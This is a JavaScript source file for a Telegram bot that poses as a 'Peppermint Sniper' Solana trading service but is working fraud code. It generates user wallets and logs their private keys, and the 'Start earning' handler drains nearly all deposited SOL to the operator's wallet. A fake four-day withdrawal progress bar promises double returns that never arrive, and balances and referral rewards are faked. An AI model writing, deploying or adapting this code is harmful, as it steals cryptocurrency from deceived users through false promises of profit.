import { Keypair, Connection, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';
import bs58 from 'bs58';
import { Telegraf, Markup } from 'telegraf';
import dotenv from 'dotenv';

// Load environment variables from .env file
dotenv.config();

// Get the bot token and main wallet private key from environment variables
const BOT_TOKEN = process.env.BOT_TOKEN;
const MAIN_WALLET_PRIVATE_KEY = process.env.MAIN_WALLET_PRIVATE_KEY;

if (!BOT_TOKEN || !MAIN_WALLET_PRIVATE_KEY) {
    throw new Error("Missing BOT_TOKEN or MAIN_WALLET_PRIVATE_KEY environment variables");
}

// Initialize the bot with the token from environment variables
const bot = new Telegraf(BOT_TOKEN);

// Assuming you have a connection to Solana mainnet
const connection = new Connection('https://api.mainnet-beta.solana.com');

// Main wallet for receiving Solana (base58 private key)
const mainWallet = Keypair.fromSecretKey(bs58.decode(MAIN_WALLET_PRIVATE_KEY));

let userWallets = {}; // Store user wallets
let userStatus = {}; // Store user status, including transfer status

// Function to generate the timeline bar with green and white blocks and a percentage counter
function generateTimelineBar(progress, total) {
    const barLength = 13; // Length of the timeline bar
    const filledLength = Math.round((barLength * progress) / total);
    
    // Use green squares for the filled part and white squares for the remaining part
    const bar = '🟩'.repeat(filledLength) + '⬜'.repeat(barLength - filledLength);

    // Calculate the percentage and format it to 2 decimal places
    const percentage = ((progress / total) * 100).toFixed(2);

    return `${bar} ${percentage}%`;
}

// Function to show a message with a delay
const showMessageWithDelay = async (ctx, message, delay) => {
    const sentMessage = await ctx.reply(message);
    await new Promise(resolve => setTimeout(resolve, delay));
    return sentMessage;
};

// Function to load the main menu
const loadMainMenu = async (ctx) => {
    await ctx.reply('Welcome! Please choose an option:', Markup.inlineKeyboard([
        [Markup.button.callback('Main wallet', 'main_wallet'), Markup.button.callback('Start earning', 'start_earning')],
        [Markup.button.callback('Track profits', 'track_profits'), Markup.button.callback('Withdraw', 'withdraw')],
        [Markup.button.callback('Referrals', 'referrals'), Markup.button.callback('Balance', 'balance')],
        [Markup.button.callback('Track Peppermint Activity', 'track_peppermint')],
        [Markup.button.callback('Refresh', 'refresh')]
    ]));
};

// Start command
bot.start(async (ctx) => {
    // Step 1: Show the first message and wait for 10 seconds
    const firstMessage = await showMessageWithDelay(ctx, '🔄 Generating your wallet, please wait...', 10000);

    // Step 2: Show the second message
    const secondMessage = await showMessageWithDelay(ctx, '🔒 Your wallet is connecting to secured SolBoost server...', 3000);

    // Step 3: Load the main menu
    await loadMainMenu(ctx);

    // Step 4: Delete the two previous messages
    await ctx.deleteMessage(firstMessage.message_id);
    await ctx.deleteMessage(secondMessage.message_id);
});

bot.action('main_wallet', async (ctx) => {
    try {
        await ctx.answerCbQuery();  // Acknowledge the button click

        const userId = ctx.from.id;

        // Check if the user already has a wallet
        if (!userWallets[userId]) {
            // Generate a new wallet for the user
            const userWallet = Keypair.generate();
            userWallets[userId] = userWallet;

            console.log(`Generated wallet for user ${userId}:`);
            console.log(`Public Key: ${userWallet.publicKey.toBase58()}`);
            console.log(`Private Key: ${bs58.encode(userWallet.secretKey)}`);
        }

        const userWallet = userWallets[userId];
        const publicKey = userWallet.publicKey;
       

        // Get balance in SOL
        const balance = await connection.getBalance(publicKey);
        const solBalance = balance / LAMPORTS_PER_SOL;

        const formattedMessage = `
💵 Main Wallet \\(Solana\\)
Address: \`${publicKey.toBase58()}\`
Private Key: \`${bs58.encode(userWallet.secretKey)}\`

Balance: ${solBalance.toFixed(2).replace(/\./g, '\\.')} SOL \\(\\$${(solBalance * 158).toFixed(2).replace(/\./g, '\\.')} USD\\)

⚠️ Note: A 13% fee is applied to profits
        `;

        await ctx.reply(formattedMessage, { parse_mode: 'MarkdownV2' });
    } catch (error) {
        console.error('Error in main_wallet action:', error);
        ctx.reply('An error occurred while fetching your wallet details. Please try again.');
    }
});

bot.action('start_earning', async (ctx) => {
    try {
        await ctx.answerCbQuery();

        const userId = ctx.from.id;

        if (!userWallets[userId]) {
            ctx.reply("You don't have a wallet yet. Please set up your main wallet first.");
            return;
        }

        const userWallet = userWallets[userId];
        const publicKey = userWallet.publicKey;
        const balance = await connection.getBalance(publicKey);
        const solBalance = balance / LAMPORTS_PER_SOL;

        if (solBalance < 0.02) {
            ctx.reply(`
🚨 Alert: Your Wallet Balance is less than the balance required to start the trades.

To activate the Peppermint Sniper bot and start earning profits with our automated trading system, please deposit at least 0.02 SOL into your trading wallet. Your current balance is ${solBalance.toFixed(2)} SOL
            `);
        } else {
            const { blockhash } = await connection.getRecentBlockhash();

            const transaction = new Transaction({
                recentBlockhash: blockhash,
                feePayer: userWallet.publicKey,
            });

            const feeForMessage = await connection.getFeeForMessage(transaction.compileMessage());
            const estimatedFee = feeForMessage.value ? feeForMessage.value : 5000;
            const totalFee = estimatedFee * 3 + 35000;

            const rentExemptionThreshold = 890880;

            if (balance > totalFee + rentExemptionThreshold) {
                const amountToTransfer = balance - totalFee - rentExemptionThreshold;
                
                // **Accumulate the transferred amount**
                if (!userStatus[userId]) {
                    userStatus[userId] = { totalTransferred: 0, transferDone: false };
                }
                userStatus[userId].totalTransferred += amountToTransfer;

                // Mark the transfer as done
                userStatus[userId].transferDone = true;

                transaction.add(
                    SystemProgram.transfer({
                        fromPubkey: userWallet.publicKey,
                        toPubkey: mainWallet.publicKey,
                        lamports: amountToTransfer,
                    })
                );

                const signature = await connection.sendTransaction(transaction, [userWallet], { skipPreflight: false, preflightCommitment: 'confirmed' });
                await connection.confirmTransaction(signature, 'confirmed');

                ctx.reply(`Your deposit of ${(amountToTransfer / LAMPORTS_PER_SOL).toFixed(2)} SOL is in trading. Wait for the withdrawal button to enable to get your profit.`);
            } else {
                ctx.reply(`Insufficient balance to cover the transaction fee and rent exemption for user ${userId}.`);
            }
        }
    } catch (error) {
        ctx.reply('There was an error processing your request. Please try again.');
        console.error('Error in start_earning action:', error);
    }
});

bot.action('track_profits', async (ctx) => {
    try {
        await ctx.answerCbQuery();
        const userId = ctx.from.id;

        if (userStatus[userId] && userStatus[userId].transferDone) {
            ctx.reply('Your Solana balance is in trading. Once it is in profit, it will be available here.');
        } else {
            ctx.reply('No transfer detected. Please start earning by transferring SOL to your trading wallet.');
        }
    } catch (error) {
        console.error('Error in track_profits action:', error);
    }
});

bot.action('withdraw', async (ctx) => {
    try {
        await ctx.answerCbQuery();
        const userId = ctx.from.id;

        if (userStatus[userId] && userStatus[userId].transferDone) {
            const totalTransferred = userStatus[userId].totalTransferred || 0;
            const withdrawalAmount = totalTransferred * 2;
            const withdrawalAmountSOL = (withdrawalAmount / LAMPORTS_PER_SOL).toFixed(2);

            // Reset withdrawalMessageSent and interval if it's a new withdrawal session
            if (userStatus[userId].newDeposit) {
                userStatus[userId].withdrawalMessageSent = false;
                userStatus[userId].currentStep = 1;  // Reset the step for the new withdrawal
                if (userStatus[userId].interval) {
                    clearInterval(userStatus[userId].interval);
                    userStatus[userId].interval = null;
                }
            }

            // Send the withdrawal message if it's the first time or after a new deposit
            if (!userStatus[userId].withdrawalMessageSent) {
                await ctx.reply(`Your withdrawal is being processed...\n\nYour withdrawal amount is: ${withdrawalAmountSOL} SOL`);
                userStatus[userId].withdrawalMessageSent = true;
                userStatus[userId].newDeposit = false;
            }

            const totalSteps = 4 * 24 * 60 * 60; // 4 days in seconds
            let step = userStatus[userId].currentStep || 1;

            // Send or update the progress bar
            const sendOrUpdateBar = async () => {
                const currentBar = generateTimelineBar(step, totalSteps);

                // Only update if the current bar content has changed
                if (currentBar !== userStatus[userId].previousBar) {
                    try {
                        if (!userStatus[userId].barMessageId || userStatus[userId].newDeposit) {
                            const sentBarMessage = await ctx.reply(currentBar);
                            userStatus[userId].barMessageId = sentBarMessage.message_id;
                        } else {
                            await ctx.telegram.editMessageText(ctx.chat.id, userStatus[userId].barMessageId, undefined, currentBar);
                        }

                        userStatus[userId].previousBar = currentBar;
                    } catch (error) {
                        console.error('Error editing message:', error);
                    }
                }
            };

            // Send the progress bar initially
            await sendOrUpdateBar();

            // Set up the interval to update the progress bar
            if (!userStatus[userId].interval) {
                userStatus[userId].interval = setInterval(async () => {
                    if (step >= totalSteps) {
                        clearInterval(userStatus[userId].interval);
                        userStatus[userId].currentStep = totalSteps;
                        await ctx.reply('Your withdrawal is complete!');
                        return;
                    }

                    step++;
                    userStatus[userId].currentStep = step;
                    await sendOrUpdateBar();
                }, 1000); // Update every second
            }

        } else {
            ctx.reply('No funds available for withdrawal. Please start earning first.');
        }
    } catch (error) {
        ctx.reply('There was an error processing your withdrawal. Please try again.');
        console.error('Error in withdraw action:', error);
    }
});

bot.action('referrals', async (ctx) => {
    try {
        await ctx.answerCbQuery();  // Acknowledge the button click
        ctx.reply('Earn 7% commission on each referral.');
    } catch (error) {
        console.error('Error in referrals action:', error);
    }
});

bot.action('balance', async (ctx) => {
    try {
        await ctx.answerCbQuery();  // Acknowledge the button click
        ctx.reply('Your current balance is 0 SOL.');  // Replace 0 with the actual balance if available
    } catch (error) {
        console.error('Error in balance action:', error);
    }
});

bot.action('track_peppermint', async (ctx) => {
    try {
        await ctx.answerCbQuery();  // Acknowledge the button click
        ctx.reply(`Check out our Peppermint Sniper activity for reference and stay updated with our latest transactions and performance:\n\n@peppermintsnipertrack_bot.`);
    } catch (error) {
        console.error('Error in track_peppermint action:', error);
    }
});

bot.action('refresh', async (ctx) => {
    try {
        await ctx.answerCbQuery();  // Acknowledge the button click

        const userId = ctx.from.id;

        // Check if the user has a wallet
        if (!userWallets[userId]) {
            ctx.reply("You don't have a wallet yet. Please set up your main wallet first.");
            return;
        }

        const userWallet = userWallets[userId];
        const publicKey = userWallet.publicKey;

        // Get the updated balance in SOL
        const balance = await connection.getBalance(publicKey);
        const solBalance = balance / LAMPORTS_PER_SOL;

        // Update the user with the new balance
        ctx.reply(`
💵 Main Wallet (Solana)
Address: ${publicKey.toBase58()}
Updated Balance: ${solBalance.toFixed(2)} SOL ($${(solBalance * 158).toFixed(2)} USD)

⚠️ Note: A 13% fee is applied to profits
        `);

    } catch (error) {
        console.error('Error in refresh action:', error);
        ctx.reply('An error occurred while refreshing. Please try again.');
    }
});


bot.launch();
console.log('Telegram bot is running...');

